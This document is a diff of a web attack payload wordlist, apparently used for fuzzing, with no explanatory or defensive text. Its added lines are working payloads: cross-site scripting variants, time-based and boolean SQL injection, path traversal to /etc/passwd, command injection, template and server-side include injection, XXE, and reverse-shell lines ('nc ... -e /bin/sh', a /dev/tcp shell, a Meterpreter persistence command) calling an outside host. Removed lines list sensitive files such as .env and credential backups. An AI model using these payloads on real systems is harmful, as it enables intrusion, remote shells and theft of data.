@@ -1,151 +1,338 @@
+<img+src%3dOnXSS+OnError%3dalert('AliElTop')>
 '; SELECT * FROM users; --
-"<script>alert('AliElTop')</script>
+<p onclick="this.innerText = getCode('AliElTop')">('AliElTop')</p>
+<a href="javascript:alert('AliElTop')">('AliElTop')</a>
+<a href="javascript:(function(){var page = document.createElement('html');page.innerHTML = '<head><title>AliElTop</title></head><body><h1>Hello AliElTop!</h1></body></html>';document.write('<!DOCTYPE html>' + page.outerHTML);})()">('AliElTop')</a>
+<script>alert('AliElTop');</script>
+<img src="invalid-image" onerror="alert('AliElTop')">
+<input type="text" value="AliElTop" onfocus="alert('AliElTop')">
+<svg/onload="alert('AliElTop')">
+<img src=x onerror="alert('AliElTop')">
+<head></head><body>padding<script>alert("AliElTop")</script>AliElTop</body>
+"<SVg/ONloAd=alert(13337777)>"@x.y
+"><svg/onload=prompt(/AliElTop/)>
+'"--!><img src=x onerror=alert("AliElTop")> 
+'"/><svg/onload=prompt(/AliElTop/)>
+'"><script>alert("AliElTop")</script>
+'"><script>confirm("AliElTop")</script>
+'"><script>prompt("AliElTop")</script>
+'"><svg/onload=alert(/AliElTop/)>
+/cgi-bin/rr.cgi/https://www.google.com/
+'"><svg/onload=confirm(/AliElTop/)>
+'"><svg/onload=prompt(/AliElTop/)>
+'>"/><svg/onload=prompt(/AliElTop/)>
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<img  src="x:gif" onerror="window['al\u0065rt'](13337777)"></img>
+<svg/onload=prompt(/AliElTop/)>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("AliElTop")//>\x3exss.txt
+'"><svg/onload=prompt`13337777`>
+'"><svg/onload=alert`13337777`>')>
+'"><svg/onload=confirm`13337777`>
+'"><script>alert`13337777`</script> 
+><script>alert`13337777`</script> 
+'"><svg onload=prompt`AliElTop`>
+'"><svg onload=alert`AliElTop`>
+'"><svg onload=confirm`AliElTop`>
+<!'/*!"/*!/'/*/"/*--!><Input/Autofocus/*/Onfocus=confirm`AliElTop`//><Svg>/
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnQWxpRWxUb3AnKTwvc2NyaXB0Pg==">('AliElTop')</a>
+<img src=x onerror="alert('AliElTop');">
+<Svg Only=1 OnLoad="alert('AliElTop')">
+../../../../../../../../../../../../../../windows/win.ini
+;alert(md5('AliElTop'))
+{% For c in [1,2,3]%} {{c,c,c}} {% endfor %}
+{{4*4}}[[5*5]]
+%26ls||id%26
+AliElTop
+gh1tpn7ip68xi45lg48197t9107rvhj6.oastify.com
+â€œ><script>alert(document.domain)</script>
+<Svg Only=1 OnLoad=confirm(atob("QWxpRWxUb3A="))>
+")'<!--><Svg OnLoad=(confirm)(13337777)<!--
+">'-(k=alert,k(13337777))-'
+<form><button formaction=javascript&colon;alert(13337777)
+#"><img src=/ onerror=alert(13337777)>
+<style><style /><img src=x onerror=alert(13337777)>
+<img alt="<x" title="/><img src=x onerror=alert(13337777)>">
+javascript://%0aalert(13337777)
+<script\x20type="text/javascript">javascript:alert(13337777);</script>
+<script\x3Etype="text/javascript">javascript:alert(13337777);</script>
+<script\x0Dtype="text/javascript">javascript:alert(13337777);</script>
+<script\x09type="text/javascript">javascript:alert(13337777);</script>
+<script\x0Ctype="text/javascript">javascript:alert(13337777);</script>
+<script\x2Ftype="text/javascript">javascript:alert(13337777);</script>
+<script\x0Atype="text/javascript">javascript:alert(13337777);</script>
+'`"><\x3Cscript>javascript:alert(13337777)</script>        
+'`"><\x00script>javascript:alert(13337777)</script>
+<img src=1 href=1 onerror="javascript:alert(13337777)"></img>
+<audio src=1 href=1 onerror="javascript:alert(13337777)"></audio>
+<video src=1 href=1 onerror="javascript:alert(13337777)"></video>
+<body src=1 href=1 onerror="javascript:alert(13337777)"></body>
+<image src=1 href=1 onerror="javascript:alert(13337777)"></image>
+<object src=1 href=1 onerror="javascript:alert(13337777)"></object>
+<script src=1 href=1 onerror="javascript:alert(13337777)"></script>
+<svg xmlns="http://0x0.sytes.net/ali1.svg" onload="alert(13337777)"/>
+-1" OR 2+199-199-1=0+0+0+1 --
+-10'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+if(now()=sysdate(),sleep(20),0)
+0"XOR(if(now()=sysdate(),sleep(20),0))XOR\
+${@print(md5(31337))}
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+'(select*from(select(sleep(20)))a)'
+_next/image?url=
+'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'
+%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1
+../../../../../../../../../../../../../../etc/passwd
+" + response.write(9776594*9852164) + \
+sh -i 5<> /dev/tcp/0x0.sytes.net/4444 0<&5 1>&5 2>&5
+run persistence -U -i 5 -p 4444 -r 0x0.sytes.net
+nc 0x0.sytes.net 4444 -e /bin/sh
+onmouseover=alert('AliElTop')
+0x0.sytes.net:4444
+http://0x0.sytes.net:4444
+confirm('AliElTop')
+http://0x0.sytes.net/ali1.svg
+{{['id']|filter('system')}}
+javascript:alert(1)
+;@include('http://0x0.sytes.net/ali1.svg')
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/8dis0rxh46\';document.body.appendChild(a)')
+"><a/href="javascrip&#116&#000000000000000000000000000000000000000000000058a:confirm(document.cookie)">AliElTop
+"><a/href="javascrip&#116&#000000000000000000000000000000000000000000000058a:confirm(document.location)">AliElTop
+"><a/href="javascrip&#116&#000000000000000000000000000000000000000000000058a:confirm(document.domain)">AliElTop
+<a href="javascript:alert('AliElTop')">AliElTop</a>
 "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>
 webshell.php
 admin' OR '1'='1
+"<img src="0x0.sytes.net" onload=window.open("0x0.sytes.net","AliElTop",'height=500,width=500');>
 ../../../../etc/passwd%00
 "<img src=x onerror=alert('AliElTop')>
+"<img src=x onload=alert('AliElTop')>
+<iframe src=x onerror=prompt(13337777)>
+"onclick=prompt(13337777)><svg/onload=prompt(13337777)>"@x.y
+<iframe src=x onerror=confirm(13337777)>
+<iframe src=x onerror=alert(13337777)>
 "<?php system($_GET['cmd']); ?>
 ../../../../etc/passwd
 %27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo
-evil_script.js
 ;ls
 ls
-admin.php
-+9739343777;phone-context=<script>alert(AliElTop)</script>
-+91 97xxxx7x7;ext=1;ext=2
-+91 97xxxx7x7;phone-context=' OR 1=1; -
-+91 97xxxx7x7;phone-context={{4*4}}{{5+5}}
-robots.txt
-adminer.php
-phpmyadmin
-dbadmin
-.env
-config.php
-config.yaml
-application.properties
-.git/config
-.svn/entries
-.DS_Store
-backup.zip
-backup.tar.gz
-database.bak
-database.sql
-config.bak
-config.zip
-.git
-.svn
-.htaccess
-.htpasswd
-secure
-secret
-confidential
-api_key
-secret_key
-private_key
-credentials
-password
-credit_card
-session
-log
-error.log
-access.log
-debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
-robots.txt
-backup.zip
-backup.tar.gz
-database.bak
-database.sql
-config.bak
-config.zip
-.git
-.svn
-.htaccess
-.htpasswd
-secure
-secret
-confidential
-api_key
-secret_key
-private_key
-credentials
-password
-credit_card
-session
-log
-error.log
-access.log
-debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
-robots.txt
-backup.zip
-backup.tar.gz
-database.bak
-database.sql
-config.bak
-config.zip
-.git
-.svn
-.htaccess
-.htpasswd
-secure
-secret
-confidential
-api_key
-secret_key
-private_key
-credentials
-password
-credit_card
-session
-log
-error.log
-access.log
-debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
-logs/app.log
-logs/error.log
-logs/access.log
-logs/debug.log
+<image/src/onerror=alert('AliElTop')>
+<img/src/onerror=alert('AliElTop')>
+<image src/onerror=alert('AliElTop')>
+<img src/onerror=alert('AliElTop')>
+<image src =q onerror=alert('AliElTop')>
+<img src =q onerror=alert('AliElTop')>
+</scrip</script>t><img src =q onerror=alert('AliElTop')>
+<script\x20type="text/javascript">alert('AliElTop');</script>
+<script\x3Etype="text/javascript">alert('AliElTop');</script>
+<script\x0Dtype="text/javascript">alert('AliElTop');</script>
+<script\x09type="text/javascript">alert('AliElTop');</script>
+<script\x0Ctype="text/javascript">alert('AliElTop');</script>
+<script\x2Ftype="text/javascript">alert('AliElTop');</script>
+<script\x0Atype="text/javascript">alert('AliElTop');</script>
+'`"><\x3Cscript>alert('AliElTop')</script>
+'`"><\x00script>alert('AliElTop')</script>
+<img src=1 href=1 onerror="alert('AliElTop')"></img>
+<audio src=1 href=1 onerror="alert('AliElTop')"></audio>
+<video src=1 href=1 onerror="alert('AliElTop')"></video>
+<body src=1 href=1 onerror="alert('AliElTop')"></body>
+<image src=1 href=1 onerror="alert('AliElTop')"></image>
+<object src=1 href=1 onerror="alert('AliElTop')"></object>
+<script src=1 href=1 onerror="alert('AliElTop')"></script>
+..//etc/passwd
+../..//etc/passwd
+../../..//etc/passwd
+../../../..//etc/passwd
+../../../../..//etc/passwd
+../../../../../..//etc/passwd
+../../../../../../..//etc/passwd
+../../../../../../../..//etc/passwd
+..%2f/etc/passwd
+..%2f..%2f/etc/passwd
+..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+%2e%2e//etc/passwd
+%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system('cat%20/etc/passwd')
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+| id
+& id
+; id
+%0a id %0a
+$;/usr/bin/id
+cat /etc/hosts
+$(`cat /etc/passwd`)
+cat /etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+# from wapiti
+sleep(20)#
+1 or sleep(20)#
+" or sleep(20)#
+' or sleep(20)#
+" or sleep(20)="
+' or sleep(20)='
+1) or sleep(20)#
+") or sleep(20)="
+') or sleep(20)='
+1)) or sleep(20)#
+")) or sleep(20)="
+')) or sleep(20)='
+;waitfor delay '0:0:20'--
+);waitfor delay '0:0:20'--
+';waitfor delay '0:0:20'--
+";waitfor delay '0:0:20'--
+');waitfor delay '0:0:20'--
+");waitfor delay '0:0:20'--
+));waitfor delay '0:0:20'--
+'));waitfor delay '0:0:20'--
+"));waitfor delay '0:0:20'--
+benchmark(10000000,MD5(20))#
+1 or benchmark(10000000,MD5(20))#
+" or benchmark(10000000,MD5(20))#
+' or benchmark(10000000,MD5(20))#
+1) or benchmark(10000000,MD5(20))#
+") or benchmark(10000000,MD5(20))#
+') or benchmark(10000000,MD5(20))#
+1)) or benchmark(10000000,MD5(20))#
+")) or benchmark(10000000,MD5(20))#
+')) or benchmark(10000000,MD5(20))#
+pg_sleep(20)--
+1 or pg_sleep(20)--
+" or pg_sleep(20)--
+' or pg_sleep(20)--
+1) or pg_sleep(20)--
+") or pg_sleep(20)--
+') or pg_sleep(20)--
+1)) or pg_sleep(20)--
+")) or pg_sleep(20)--
+')) or pg_sleep(20)--
+AND (SELECT * FROM (SELECT(SLEEP(20)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(20)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)#
+SLEEP(20)#
+SLEEP(20)--
+SLEEP(20)="
+SLEEP(20)='
+or SLEEP(20)
+or SLEEP(20)#
+or SLEEP(20)--
+or SLEEP(20)="
+or SLEEP(20)='
+waitfor delay '00:00:20'
+waitfor delay '00:00:20'--
+waitfor delay '00:00:20'#
+benchmark(50000000,MD5(20))
+benchmark(50000000,MD5(20))--
+benchmark(50000000,MD5(20))#
+or benchmark(50000000,MD5(20))
+or benchmark(50000000,MD5(20))--
+or benchmark(50000000,MD5(20))#
+pg_SLEEP(20)
+pg_SLEEP(20)--
+pg_SLEEP(20)#
+or pg_SLEEP(20)
+or pg_SLEEP(20)--
+or pg_SLEEP(20)#
+'\"
+AnD SLEEP(20)
+AnD SLEEP(20)--
+AnD SLEEP(20)#
+&&SLEEP(20)
+&&SLEEP(20)--
+&&SLEEP(20)#
+' AnD SLEEP(20) ANd '1
+'&&SLEEP(20)&&'1
+ORDER BY SLEEP(20)
+ORDER BY SLEEP(20)--
+ORDER BY SLEEP(20)#
+(SELECT * FROM (SELECT(SLEEP(20)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(20)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(20)))ecMj)--
++benchmark(3200,SHA1(20))+'
++ SLEEP(20) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(20)/*' or SLEEP(20) or '" or SLEEP(20) or "*/
+<pre>system('cat /etc/passwd')</pre>
+<svg xmlns="http://0x0.sytes.net/ali1.svg" onload="alert(document.domain)"/>
